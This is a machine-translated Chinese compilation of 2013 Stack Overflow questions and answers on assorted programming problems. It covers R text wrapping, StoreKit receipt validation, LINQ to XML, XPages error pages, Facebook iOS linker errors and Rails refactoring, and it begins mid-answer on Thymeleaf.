在当前稳定版本的 Thymeleaf 中是不可能的。[如Thymeleaf 第 10 期中](https://github.com/thymeleaf/thymeleaf/issues/10)所述，它计划用于 2.1 版

# regex - 在长字符串中插入换行符

> ID：15526147
> 
> 赞同：3
> 
> 时间：2013-03-20T14:19:36.743
> 
> 标签：regex, string, r

我正在编写一个函数来以 tex 格式编写自动表格。我遇到的一个问题是带有长字符串的表格。为了解决这个问题，我创建了一个将长字符串分成更多行的函数。我的函数在之前至少有字符的每个空格中中断`len`（它不会中断单词）。我想将此规则更改为：在下一个空格至少包含`len`字符的每个空格中插入（换句话说，我不希望包含多个`len`字符的“子字符串”，除非一个单词的字符数超过 10 个）。

```
 quebra <- function(text, len=30) {
  trim <- function(x) gsub('^ *|(?<= ) | *$', '', x, perl=TRUE)
  quebrado <- strsplit(trim(paste(text)),paste0('(?<=.{',len,'}) '), perl=T)
  tam <- max(sapply(quebrado, length))
  out <- sapply(quebrado, function(x, tam) x[1:tam], tam=tam)
  out[is.na(out)] <- ''
  out
 } 
```

例子：

`quebra('1234567890 123456789 123456789', 10)`正在返回：

```
 [,1]                 
[1,] "1234567890"         
[2,] "123456789 123456789" 
```

但我想要：

```
 [,1]                 
[1,] "1234567890"         
[2,] "123456789"
[3,] "123456789" 
```

我认为[这](https://stackoverflow.com/questions/2351744/insert-line-breaks-in-long-string-word-wrap)应该可行，但我无法使其适应`strsplit()`格式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:24:19.703

不要重新发明轮子。只需使用`strwrap`.

# ios - 当服务器端收据验证失败时，我应该调用 finishTransaction 吗？

> ID：15526156
> 
> 赞同：17
> 
> 时间：2013-03-20T14:19:56.817
> 
> 标签：ios, storekit

我使用服务器端收据验证。

当客户的

`- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions`

被调用，并且`transactionState`是`SKPaymentTransactionStatePurchased`，客户端将收据发送到我们的服务器，我们的服务器验证它。

服务端回执验证成功后，客户端明显调用`finishTransaction`，没问题。

当服务器端回执验证失败时，因为苹果临时返回非json，或者客户端发送了无效的回执，或者其他什么，服务器将该信息返回给客户端。

接下来，我们的客户应该怎么做？我们应该打电话`finishTransaction`吗？

这会导致无效交易永远存在于队列中吗？就像在这个问题[中所说：iPhone应用内购买：收据验证](https://stackoverflow.com/questions/4863497/iphone-in-app-purchase-receipt-verification)

> 但如果您发现收据无效，您应该完成关联交易。如果没有，您可能在事务队列中永远存在额外事务。这意味着每次您的应用程序运行时，paymentQueue:updatedTransaction: 将在每个事务中调用一次......

但是如果我们这样做`finishTransaction`了，我们宝贵的用户就会被这张收据收费（我们未能验证），对吧？

或者验证失败的交易是否会在某个时间段内过期？

这是否记录在苹果文档的某个地方？[我在http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/Introduction/Introduction.html](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StoreKitGuide/Introduction/Introduction.html)中找不到任何内容

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-26T07:46:20.960

是的，你必须完成交易。

如果你给用户他们想要的东西，这取决于你。在某些情况下，最好给用户他们想要的东西，即使收据无效或伪造（使用越狱）。尤其是当它不花钱的时候。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-29T14:46:05.473

我完成事务以将其从队列中清除，但如果验证失败，则不提供额外内容。如果收据无效，则 Apple 不会向其收费。如果结果是其他原因，例如 Apple 的验证服务器暂时关闭，那么他们将被收取费用，当他们尝试恢复购买（或再次添加）时，他们将不会再次被收取费用，并且您的应用程序将获得再次验证收据。

如果验证因技术原因（例如 Apple 的服务器关闭）而失败，那将会很尴尬，但我认为没有其他方法可以防止有人窃取您的内容。好消息是，如果 Apple 的服务器出现故障，您可以在弹出窗口中通知用户，他们应该稍后再试一次，最重要的是不会再次向他们收费。

# windows - C++ Builder - 处理操作系统以遍历所有驱动器

> ID：15526157
> 
> 赞同：0
> 
> 时间：2013-03-20T14:19:57.293
> 
> 标签：windows, backup, c++builder, usb-drive

我正在将 Borland C++ Builder 用于连接到数据库的项目。

有一个配置可以备份到 USB 驱动器。当前方法的问题在于驱动器是由最终用户手动配置的，有时事情会变得一团糟。例如，人们将 USB 驱动器移动到不同的端口，得到不同的字母，然后备份过程不再有效。附带说明一下，我们还有其他“更好”的备份到云等过程，但是有些位置没有互联网访问权限，也没有在 RAID 上运行……所以备份到 USB 给了他们一个从 HD 崩溃中拯救恩典。

我希望做一些编码来帮助解决这个问题。我希望能够掌握操作系统（Windows 8/7/XP）并能够识别机器上的驱动器。一旦我有了这些，我就可以遍历它们并检查路径位置（例如文件标记，所以如果文件存在，我知道它是我们提供的 USB）。然后，一旦我有了它，我就可以做备份。

作为更糟糕的情况，我将能够遍历所有 26 个字母来测试每个驱动器。但是，我将此用作学习机会，并希望能够掌握操作系统，从而减少我可能遇到的检查/失败次数。此外，我很好奇是否有人有更好的方法:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:33:50.467

我认为尝试做一些比迭代 26 个驱动器号更高级的事情并没有什么好处。

在尝试检查标记路径是否存在之前，您可以添加一个调用`GetDriveType`并将返回值与`DRIVE_REMOVABLE`. 这将确保您的代码不会启动 CD/DVD 驱动器，或在映射共享的情况下访问网络。

# android - 使用 chartengine 处理点击

> ID：15526164
> 
> 赞同：0
> 
> 时间：2013-03-20T14:20:12.793
> 
> 标签：android, achartengine

我正在使用带有 achartengine 的图表视图来显示每日情绪跟踪器。图表上的点是从本地数据库中填充的。图表上的每个点都是可点击的。但是，潜在点数（一天中的分钟数）比实际点数（当用户添加到他们的日记时）要多得多。这使得在使用手机时实际注册 onclick 事件变得非常困难。它在模拟器中运行良好，但那是因为鼠标比拇指更精确。有人对如何使图表视图中的点更容易点击有任何建议吗？（即，有没有办法将所有内容分散开来；我是否应该将潜在点压缩为每小时而不是每分钟等）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T16:51:04.243

找到它....它是 .setSelectableBuffer(int buffer)

# xpages - XPages 自定义错误页面 - 获取错误消息和行

> ID：15526170
> 
> 赞同：0
> 
> 时间：2013-03-20T14:20:26.597
> 
> 标签：xpages

我正在尝试为我的 xpages 生成自定义错误页面。我搜索了很多解决方案，到目前为止，我收到一个错误页面，告诉我发生了错误。

但是我无法获得确切发生的信息（在这种情况下，错误是必须保存“doc”，但我将变量命名为“docs”只是为了得到错误）。

我所做的就是：

```
var errObj = requestScope.error; 
output = errObj.getCause().getErrorPropertyId();
output = errObj.getCause().getComponentId(); 
```

当我尝试调用 getExpressionText() 时，我得到一个错误 500。

如何获取信息、错误发生的位置（行号）以及导致错误的变量？- 就像我使用标准错误页面一样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:45:57.110

看看 Tony McGuckin 的这个 XSnippet：http://openntf.org/XSnippets.nsf/snippet.xsp?id=custom-error-page-cw-cause-and-stacktrace- [information](http://openntf.org/XSnippets.nsf/snippet.xsp?id=custom-error-page-cw-cause-and-stacktrace-information)。它使用以下内容输出有关错误的详细信息：

```
 var output = requestScope.error.toString()+"\n\n";
  if(requestScope.error instanceof com.ibm.xsp.exception.XSPExceptionInfo){
    var codeSnippet = requestScope.error.getErrorText(); 
    var control = requestScope.error.getErrorComponentId();
    var cause = requestScope.error.getCause();
    output += "In the control : " + control + "\n\n";
    if(cause instanceof com.ibm.jscript.InterpretException){
      var errorLine = cause.getErrorLine();
      var errorColumn = cause.getErrorCol();
      output += "At line " + errorLine;
      output += ", column " + errorColumn + " of:\n";
    }else{
      output += "In the script:\n";
    }
    output += codeSnippet;
  }
  return output; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-26T23:36:14.853

错误行和详细信息不容易从 requestScope.error 访问。如果您查看最新版本的 Mark Leusink 调试工具栏的源代码，您会看到他正在解析堆栈跟踪以获取详细信息。

但是，您可以使用 SSJS 异常的底层 Java 类访问所有相关信息 - 使用 getErrorLine() 的 com.ibm.jscript.InterpretException。getLocalizedMessage() 方法获取通常以“脚本解释器错误”开头的错误详细信息。getExpressionText() 方法检索引发错误的行。

如果您看一下我放在 OpenNTF 上的 XPages OpenLog Logger 项目，我就是用它来将完整的详细信息记录到 OpenLog。[http://www.openntf.org/Internal/home.nsf/project.xsp?action=openDocument&name=XPages%20OpenLog%20Logger](http://www.openntf.org/Internal/home.nsf/project.xsp?action=openDocument&name=XPages%20OpenLog%20Logger)

您可以在此处查看使用这些方法的 OpenLogPhaseListener 的源代码：[https ://github.com/paulswithers/openlogjava/blob/master/OpenLogJava/WebContent/WEB-INF/src/com/paulwithers/openLog/OpenLogPhaseListener.java](https://github.com/paulswithers/openlogjava/blob/master/OpenLogJava/WebContent/WEB-INF/src/com/paulwithers/openLog/OpenLogPhaseListener.java)

即使您不是 Java 专家，使用 SSJS 的关键部分也应该是可以理解的。第 84 行捕获未捕获的异常 - 当 XPages 路由到默认错误页面时。那使用我提到的方法。

如果您只使用 catch 块，第 98 到 105 行是注销所有详细信息的行，传递错误对象的`OpenLogBean.addError(e, this)`位置和发生错误的组件。Java 代码中的 error.getError() 检索该错误对象。要获得 SSJS 中的预输入，您需要使用我相信。`e``this``catch(e:com.ibm.jscript.InterpretException)`

我还没有测试过这个，我只是从我在 OpenNTF 上的项目中使用的东西开始工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-26T12:27:21.770

现在我已经通过使用[Debug Toolbar](http://www.openntf.org/internal/home.nsf/project.xsp?action=openDocument&name=XPage%20Debug%20Toolbar)和[OpenLog Database](http://www.openntf.org/internal/home.nsf/project.xsp?action=openDocument&name=OpenLog)处理了这个问题。

如果发生错误，用户只会获得一个自定义错误页面（使用调试工具栏的示例），其中包含该信息，即出现问题。所以他不必为任何其他问题甚至堆栈跟踪而烦恼。但在他获得错误页面的同时，错误会记录在我们的日志数据库中，其中包含所有需要的信息（如行、确切的错误消息等）。

我还实现了一个“报告此问题”链接按钮来创建一个新的电子邮件，其中包含有关用户当前所在会话的重要信息。

# c# - 不同级别的 LINQ 搜索属性

> ID：15526176
> 
> 赞同：0
> 
> 时间：2013-03-20T14:20:42.150
> 
> 标签：c#, linq, linq-to-xml

我想用 LINQ 技术搜索 xml 文件，但有一些困难。我想找到所有具有属性值和一些搜索条件的孩子

我的 XML（结构化数据）如下所示：

```
<?xml version="1.0" encoding="utf-8" standalone="yes"?> 
<LanguageMenu>
    <Menu language="English" name ="Menu" numOfMenus="1">
        <MainItem ID="e_mnuMain1" name="File" level="0"></MainItem>
        <MainItem ID="e_mnuMain2" name="Edit" level="0"></MainItem>
        <MainItem ID="e_mnuMain3" name="Query" level="0"></MainItem>
        <MainItem ID="e_mnuMain4" name="Traffic" numOfSubItem="4" level="0"> 
            <SECOND name="Vendors" value="FIN3010" level="1" father="3"></SECOND>
            <SECOND name="Buyers" value="FIN3020" level="1" father="3" ></SECOND>
            <SECOND name="General ledger" value="FIN3030" level="1" father="3"></SECOND>
            <SECOND name="Accounts" value="FIN3040" level="1" father="3">
                <THIRD name="Home Accounts" value="FIN3010" level="2" father="5" grantfather="3"/>
                <THIRD name="Foreign accounts" value="FIN3050" level="2" father="5" grantfather="3"/>
            </SECOND>
        </MainItem>
    </Menu>
</LanguageMenu> 
```

使用 LINQ，我想找到所有以 Element MainItem 开头且具有 FIN3010 值的孩子。根据我的 XML，它应该返回供应商和家庭帐户。

我也想得到那个孩子的父母，所以我想实现的输出是这样的：

```
Traffic - Vendors
Traffic - Accounts - Home Accounts 
```

我坚持使用这段代码：

```
XElement xelement = XElement.Load("../../xmlFile");
var x = from a in xelement.Descendants("SECONDS")
        where a.Attribute("value") != null 
        && (string)a.Attribute("value").Value.ToUpper() == txtSifra.Text.ToUpper()
        select a;
foreach (XElement xEle in x)
{
    //TODO
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:27:05.100

这个怎么样：

```
var x = from a in xelement.Descendants("MainItem")
                          .Descendants()
        where a.Attribute("value") != null && 
              a.Attribute("value").Value
                                  .Equals(txtSifra.Text, 
                                          StringComparison.InvariantCultureIgnoreCase)
        select a;
foreach (XElement xEle in x)
{
        // items will contain all nodes (inclusive) between MainItem and xEle
        var items = xEle.AncestorsAndSelf()
                        .Where(x1 => x1.AncestorsAndSelf("MainItem")
                                       .Any())
                        .OrderBy(x1 => x1.Ancestors().Count());
        var names = items.Attributes("name").Select(a => a.Value).ToArray();
        Console.WriteLine(string.Join(" - ", names));
} 
```

输出是：

```
Traffic - Vendors
Traffic - Accounts - Home Accounts 
```

# xaml - WP8 触发器的替代方案

> ID：15526178
> 
> 赞同：3
> 
> 时间：2013-03-20T14:20:47.347
> 
> 标签：xaml, windows-phone-8

我读过`Triggers`XAML for WP8 不支持的内容。什么是替代方法？我想在点击时使用触发器来更改按钮的背景图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-02T10:40:53.133

请试试这个。Windows phone 触发[msdn](https://msdn.microsoft.com/en-us/library/hh134799(v=expression.40).aspx)

在这里，我将图像数据触发器与我的 Boolean 属性绑定，当 Boolean 属性更改时，它将触发并且 setter 将触发。确保您的属性是使用[INofityPropertyChanged实现的](https://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged(v=vs.110).aspx)

```
 xmlns:ec="clr-namespace:Microsoft.Expression.Interactivity.Core;assembly=Microsoft.Expression.Interactions" x:Class="XXX_XXXX"
<Image Source="/Assets/Images/Tick.png"
                   Stretch="None"
                   HorizontalAlignment="Stretch" 
                   VerticalAlignment="Top">
                <interactivity:Interaction.Triggers>
                    <ec:DataTrigger Binding="{Binding IsTapped}" Value="True">
                        <ec:ChangePropertyAction PropertyName="Source">
                            <ec:ChangePropertyAction.Value>

                                <BitmapImage UriSource="/Assets/Images/Close.png"/>
                            </ec:ChangePropertyAction.Value>
                        </ec:ChangePropertyAction>
                    </ec:DataTrigger>
                </interactivity:Interaction.Triggers>
            </Image> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:18:18.510

您可以，可能只是为图像的“Tap”事件附加一个事件处理程序。如果没有代码示例，我不太确定我能提供多少帮助；但是，我在下面粘贴了一些代码：

**XAML**

```
 <Image Source="/Assets/awesomeImg.png" Tap="AwesomeImg_Tap"/> 
```

**代码背后 (C#)**

```
private void AwesomeImg_Tap(object sender, System.Windows.Input.GestureEventArgs e)
    {
      YourImageName.ImageSource = //code here to URI of image
    } 
```

希望这可以帮助！

# objective-c - 无边框窗口内容消失的问题

> ID：15526181
> 
> 赞同：0
> 
> 时间：2013-03-20T14:20:50.527
> 
> 标签：objective-c, xcode, cocoa, nswindow, nsbezierpath

如果我从我的视图中删除此方法，一切正常（如果我单击按钮，内容不会消失），所以这绝对是原因。

我正在尝试通过下面的代码制作一个圆形并具有渐变的窗口。这有什么问题会导致视图上的内容消失吗？

```
- (void)drawRect:(NSRect)dirtyRect
{
    [NSGraphicsContext saveGraphicsState];

    NSBezierPath *outerClip = [NSBezierPath bezierPathWithRoundedRect:[self bounds]
                                                              xRadius:3.0
                                                              yRadius:3.0];
    [outerClip setClip];

    NSGradient* aGradient = [[NSGradient alloc]
                             initWithStartingColor:[NSColor colorWithCalibratedWhite:1.0 alpha:1.0]
                             endingColor:[NSColor colorWithCalibratedWhite:0.65 alpha:1.0]];

    [aGradient drawInRect:[outerClip bounds] angle:270];

    [NSGraphicsContext restoreGraphicsState]; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:54:27.020

切换到 NSGradient drawInbezierPath 解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-26T02:38:36.247

我知道你回答了你自己的问题，但我想我会分享为什么你的内容会随着上面的代码消失。

使用时，`setClip`您将*删除*以前的剪切路径并将其*替换*为新路径。这意味着您将在脏区**之外**绘制，从而覆盖以前绘制的内容。

我在自己的初始屏幕上绘制圆角时遇到了同样的问题，最终找到了一种不同的方法来做我想做的事。

此外，您可以使用 的`clipRect:`类方法`NSBezierPath`将剪切路径更改为现有路径与您要限制绘图的区域的交点。当然，在调用`clipRect:`.

# opencv - 级联分类器方法

> ID：15526183
> 
> 赞同：2
> 
> 时间：2013-03-20T14:20:56.650
> 
> 标签：opencv, detect, cascade, face-detection, classification

我想使用级联分类器方法来比较找到的圆形（来自检测到人脸的图像集）和我首先定义的参考圆，以便我可以匹配这两个圆/椭圆：图像中的那个，第二个用作参考。

目标是在最后说，头部与参考相比更大或更小。

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-30T18:32:54.210

CascadeClassifier 将返回一个 cv::Rect 向量。如果您只是想将检测的相对大小与参考的大小进行比较，您可能只使用 Rect 而不必担心圆圈。您知道参考的大小，因为您定义了它，然后将其与每个检测到的 Rect 的大小进行比较。

```
cv::Size referenceSize(24,24); //you know this before hand
cv::Rect detectedObject = detectedObjects[0];//look at first Rect from cascade
if(referenceSize.area() > detectedObject.area())
{ // detection is smaller than reference
}
else
{ // detection is larger than reference
} 
```

您还可以使用 detectMultiScale 的最小/最大尺寸参数来查找仅比您的参考值更小或更大的对象。

# java - AspectJ cflow 切入点是如何实现的？

> ID：15526184
> 
> 赞同：3
> 
> 时间：2013-03-20T14:20:58.737
> 
> 标签：java, aspectj, control-flow

AspectJ 如何检查执行是否发生在方法的控制流中？它可能是一个非常有用的见解，能够在 AspectJ 项目之外自行实现功能。

您的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T14:23:27.547

我自己发现了 :-)
AspectJ 使用 ThreadLocal 变量来跟踪控制流。
资料来源：AspectJ 自己的[常见问题解答](http://eclipse.org/aspectj/doc/released/faq.php#q%3aruntimeMemory)

# c# - C# 表达式语法简写

> ID：15526188
> 
> 赞同：4
> 
> 时间：2013-03-20T14:21:09.260
> 
> 标签：c#, delegates, lambda

据我了解，我可以使用它：

```
Func<string> f1 = () => DateTime.Now.ToString(); 
```

作为以下的简写：

```
Func<string> f2 = () => { return DateTime.Now.ToString(); }; 
```

我的问题是为什么我不能对表达式做同样的事情：

```
Expression<Func<string>> exp1 = () => DateTime.Now.ToString();
Expression<Func<string>> exp2 = () => { return DateTime.Now.ToString(); }; 
```

第二行不编译。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:32:34.490

编译器以不同的方式处理这些对象。第一个将编译为 IL 方法，该方法一无所获并返回 DateTime.Now.ToString()。编译器本身会跳过返回并将其设为

```
string myMethod() { return DateTime.Now.ToString(); } 
```

第二个被生成到 LinqExpression 对象中，该对象以另一种方式处理它，因此这种语法会导致错误。虽然它们第一次看起来相同，但编译器会为它们生成不同的代码。

您可以阅读[为什么要使用 Expression<Func<T>> 而不是 Func<T>？](https://stackoverflow.com/questions/793571/why-would-you-use-expressionfunct-rather-than-funct)关于这两种结构的区别

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:32:35.247

`Expressions<>`s 不能为语句生成，只能为表达式生成。将大括号括在表达式周围的那一刻，它就变成了语句/复合语句。

# ios - iOS Facebook 登录 - 链接器错误

> ID：15526190
> 
> 赞同：0
> 
> 时间：2013-03-20T14:21:10.413
> 
> 标签：ios, facebook, login

我正在尝试在我的应用程序中实现 facebook 登录，我已遵循这两个指南：

[http://developers.facebook.com/docs/getting-started/facebook-sdk-for-ios/](http://developers.facebook.com/docs/getting-started/facebook-sdk-for-ios/) [https://developers.facebook.com/docs/howtos/login-with-facebook-using-ios-sdk/](https://developers.facebook.com/docs/howtos/login-with-facebook-using-ios-sdk/)

但是当我尝试为 iPhone 模拟器编译应用程序时出现链接器错误。

```
Undefined symbols for architecture i386:
  "_FBSessionStateChangedNotification", referenced from:
      -[AppDelegate sessionStateChanged:state:error:] in AppDelegate.o
      -[LoginViewController viewDidLoad] in LoginViewController.o
      -[AppDelegate sessionStateChanged:state:error:] in AppDelegate.o
      -[LoginViewController viewDidLoad] in LoginViewController.o
ld: symbol(s) not found for architecture i386 
```

我已确保所有必要的框架和文件都在正确的位置。另外，我在 Xcode 中没有代码错误，所以我真的不知道这里有什么问题。

拜托，非常感谢任何帮助。

* * *

编辑：

```
//AppDelegate.h

#import <UIKit/UIKit.h>
#import <FacebookSDK/FacebookSDK.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate> {

}

@property (strong, nonatomic) UIWindow *window;

extern NSString *const FBSessionStateChangedNotification;
- (BOOL)openSessionWithAllowLoginUI:(BOOL)allowLoginUI;
- (void)closeSession;
@end 
```

-

```
//  AppDelegate.m

#import "AppDelegate.h"
#import "NetworkCheck.h"

@implementation AppDelegate

- (void)dealloc
{
    [_window release];
    [super dealloc];
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Override point for customization after application launch.
    NSLog(@"Application launch");

    NetworkCheck *netCheck = [[NetworkCheck alloc] init];
    [netCheck startCheck];

    NSString *const FBSessionStateChangedNotification =     @"com.example.Login:FBSessionStateChangedNotification";

    return YES;
}

/*
 * If we have a valid session at the time of openURL call, we handle
 * Facebook transitions by passing the url argument to handleOpenURL
 */
- (BOOL)application:(UIApplication *)application
            openURL:(NSURL *)url
  sourceApplication:(NSString *)sourceApplication
         annotation:(id)annotation {
    // attempt to extract a token from the url
    return [FBSession.activeSession handleOpenURL:url];
}

/*
 * Callback for session changes.
 */
- (void)sessionStateChanged:(FBSession *)session
                  state:(FBSessionState) state
                  error:(NSError *)error
{
    switch (state) {
        case FBSessionStateOpen:
            if (!error) {
                // We have a valid session
                NSLog(@"User session found");
            }
            break;
        case FBSessionStateClosed:
        case FBSessionStateClosedLoginFailed:[FBSession.activeSession closeAndClearTokenInformation];
            break;
        default:
            break;
    }

[[NSNotificationCenter defaultCenter]
 postNotificationName:FBSessionStateChangedNotification
 object:session];

if (error) {
    UIAlertView *alertView = [[UIAlertView alloc]
                              initWithTitle:@"Error"
                              message:error.localizedDescription
                              delegate:nil
                              cancelButtonTitle:@"OK"
                              otherButtonTitles:nil];
    [alertView show];
}
}

/*
 * Opens a Facebook session and optionally shows the login UX.
 */
- (BOOL)openSessionWithAllowLoginUI:(BOOL)allowLoginUI {
return [FBSession openActiveSessionWithReadPermissions:nil
                                          allowLoginUI:allowLoginUI
                                     completionHandler:^(FBSession *session,
                                                         FBSessionState state,
                                                         NSError *error) {
                                         [self sessionStateChanged:session
                                                             state:state
                                                             error:error];
                                     }];
}

- (void) closeSession {
[FBSession.activeSession closeAndClearTokenInformation];
}

- (void)applicationWillResignActive:(UIApplication *)application
{
// Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
// Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
}

- (void)applicationDidEnterBackground:(UIApplication *)application
{
// Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. 
// If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}

- (void)applicationWillEnterForeground:(UIApplication *)application
{
// Called as part of the transition from the background to the inactive state; here you     can undo many of the changes made on entering the background.
}

- (void)applicationDidBecomeActive:(UIApplication *)application
{
// Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.

// We need to properly handle activation of the application with regards to Facebook Login
// (e.g., returning from iOS 6.0 Login Dialog or from fast app switching).
[FBSession.activeSession handleDidBecomeActive];
}

- (void)applicationWillTerminate:(UIApplication *)application
{
// Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
[FBSession.activeSession close];
}

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:33:48.173

FBSessionStateChangedNotification 是一个`extern`定义，它应该在您正在导入的任何头文件中可见，以便您在 appDelegate 中编写的代码可以访问它。

你需要转移这条线：

```
NSString *const FBSessionStateChangedNotification = @"com.example.Login:FBSessionStateChangedNotification"; 
```

到一个文件，它将使其对其他类（不仅是应用程序委托）可见。

# ruby-on-rails - 大代码重构：创建一个新项目或重构每个包的包

> ID：15526191
> 
> 赞同：0
> 
> 时间：2013-03-20T14:21:11.900
> 
> 标签：ruby-on-rails, ruby, database-design, refactoring

我们是一个致力于 Rails 2.3 项目的小团队。简短说明：该项目目前已

*   460 000 行 Ruby、CSS、JS 和 YML（包括一些插件和库）
*   350 个 ActiveRecord 类（仅项目的类）
*   最近的类和控制器中的一些 Rspec 测试（还不够）
*   需要 45 颗宝石
*   包含 2 个 Go 数据的数据库。

该项目分为大约 15 个“模块”（不是 Rails 模块），每个模块都与其他模块通信。这个项目存在好几年了，并且已经由几个人改进和维护，而不是必要的 Rails 专家。

当前的主要问题是代码的几个部分难以维护，未优化且不够“周到”（到处都有破解）。CSS 文件几乎不可读。

我们的团队正在考虑重构这个项目。我们有几个解决方案：

*   从头开始创建一个新项目，并一一包含功能。这个解决方案的优点是我们拥有项目的所有方面，并且我们可以对代码设计做出更漂亮的决定。另一个优点是我们可以更新到 Rails 3。缺少这种方法是当我们必须包含新功能时，我们必须并行维护 2 个项目。

*   逐个模块更新现有代码。这种解决方案的优点是我们只保留一个项目来维护。但是有几个不足......如何从旧模块转到新模块？如何在新旧类名之间进行？如何知道旧代码在哪里被使用并且必须被删除？......甚至更多。

有没有人已经进行过这样的大重构？

有没有人对此有经验反馈？

有没有人有其他解决方案？

谢谢阅读 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:54:45.220

这里的答案实际上取决于您拥有多少自主权以及您可以投入多少时间进行重构。对于这种规模的项目，几乎可以肯定的是，您不能只是停止所有工作并将 100% 的时间投入到~~清理~~ROR 3 迁移（*咳咳*，迁移！）。

如果我的假设是正确的，那么我的建议是使用第二种方法（例如更新现有代码）以小块方式解决这个问题。除了您概述的内容之外，我还会鼓励其他一些事情：

*   在重构一段代码之前编写测试。这将帮助您确信您没有引入问题（强调*帮助*......当然可能会出现一些破损）。
*   在可能的情况下，考虑将模块分解为单独的、独立的 gem。这将帮助您跟踪外部依赖项并找出所有 45 个外部 gem 的使用位置。它还有助于限制测试的范围。

坦率地说，第二种方法对您作为开发人员的工作来说更安全，因为它允许您改进代码库，同时响应其他业务需求。如果重构的一部分进行得太慢，您也可以停下来在其他地方重新开始，因为代码库的其余部分仍然完好无损。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:55:05.120

重构是一项繁重的工作，需要很长时间和很多思考。

与一个全新的项目相比，问题在于您必须维护一个工作项目，并且可能必须随时支持一些错误修复和功能请求。

另一方面，您对正在解决的问题有更好的理解，并且可以将现有软件用作您事实上的“功能规范”

1.  通过列出每个相互依赖关系来识别“模块”之间的接口。
2.  如有必要，清理这些“接口”
3.  通过编写单元测试来形式化接口以测试每个模块的输入和输出
4.  创建全新的模块作为替代品。从头开始架构师，并在此处进行 ruby​​ 升级。确保您的新模块通过与旧模块相同的测试。
5.  如有必要（作为临时解决方案）包装各种不兼容的部分以使它们一起工作。这可能很慢，但这是一个权宜之计。

祝你好运。

# if-statement - if 折扣声明

> ID：15526192
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:21:14.250
> 
> 标签：if-statement

```
A_quantity = 10
B_quantity = 20 
```

数量 数量

```
N = float (input('please enter the quantity of package: '))
X_total = float (N*99.00) 
```

输入费

```
Q_discount = (0.2*X_total)
W_discount = (X_total*0.3) 
```

输入总额的折扣

```
Y_total = (X_total-Q_discount)
M_total = (X_total-W_discount) 
```

折扣的费用

```
def main ():
 if N >= A_quantity:
     print ('the total cost is $', \
            format (Y_total, ',.2f'))
 else:
     if N >= B_ quantity:
         print ('the total cost is $', \
                format (M_total, ',.2f'))

main () 
```

结果应该是 792.00 美元的 10 个包

和 20 个套餐，售价 1,380.00 美元

然而第二条语句获得了 20% 的折扣，总计 1549.00 美元，而它应该只获得 30% 的折扣

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:25:31.403

我不知道它是哪种语言，但这是一个算法问题：您应该首先尝试最高值，因为它现在的设计方式，如果 N = 30 ，您将始终输入 "if" ，而不是 "else " ，如果 N=5 ，你会输入 "else" ，但是里面的 if...

让我试试，虽然我不懂语言：

```
def main ():
 if N >= B_quantity:
 print ('the total cost is $', \
        format (M_total, ',.2f'))
 else:
 if N >= A_quantity:
     print ('the total cost is $', \
            format (Y_total, ',.2f'))

main () 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:26:08.613

将产品价值除以 100 再乘以折扣

然后得到这个结果和产品 subitrair 的值

```
var SomaPercent = ValorUnit/100 * descont;

var result_fim = ValorUnit-SomaPercent; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:33:04.273

you can change the **if** condition to

> if N >= A_quantity && N < B_quantity ...
> 
> if N >= B_quantity
> 
> ..

# c# - 在一天中占用几个小时

> ID：15526202
> 
> 赞同：1
> 
> 时间：2013-03-20T14:21:43.420
> 
> 标签：c#, asp.net

假设我有一个变量`DayHours`和一个`DateTime`被调用的`CurrentDay`.

我的活动有开始日期、结束日期和小时数。它们都属于`CurrentDay` 如果它是事件的最后一天和结束日期 == `CurrentDay`，那么我需要剩下的。因此，如果一天持续 5 小时，而事件是 14 小时，而今天是最后一天，我将返回 4。

如果活动在同一天开始和结束，我会返回它的时间。如果一个事件是多天的，并且`CurrentDay`不是事件的最后一天，我会返回`DayHours`.

我怎么能在 C# 中做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:29:24.157

你已经给出了它的逻辑：

```
if (StartDate.Date == EndDate.Date) { return Hours; }
else if (EndDate.Date != CurrentDay.Date) { return DayHours; }
